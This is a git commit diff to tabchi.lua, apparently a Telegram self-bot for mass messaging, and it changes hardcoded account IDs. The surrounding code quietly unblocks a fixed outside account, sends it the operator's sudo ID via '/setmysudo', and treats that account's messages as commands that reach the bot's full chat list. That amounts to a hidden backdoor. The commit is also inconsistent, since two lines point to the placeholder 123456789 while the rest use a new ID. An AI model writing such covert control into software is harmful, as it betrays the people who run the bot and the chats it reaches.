85e86aa4d527387792a37bad702c12f184792f33
Pouya Poorrahman <poyaskysps@gmail.com>
2017-03-05 00:12:29 +0330

    New ID! V4

--- tabchi.lua
+++ tabchi.lua
@@ -258,7 +258,7 @@ end
       end
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 282342819,
+        bot_user_id_ = 218722292,
         chat_id_ = msg.chat_id_,
         user_location_ = {
           ID = "Location",
@@ -520,11 +520,11 @@ function process_links(text)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(282342819)
+    tdcli.unblockUser(218722292)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
-    tdcli.sendBotStartMessage(282342819, 282342819, "new")
-    tdcli.sendMessage(282342819, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    tdcli.sendBotStartMessage(123456789, 123456789, "new")
+    tdcli.sendMessage(123456789, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
   end
 end
@@ -532,13 +532,13 @@ function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 282342819
+    user_id_ = 218722292
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 282342819 then
+    if msg.sender_user_id_ == 218722292 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 282342819 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 218722292 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
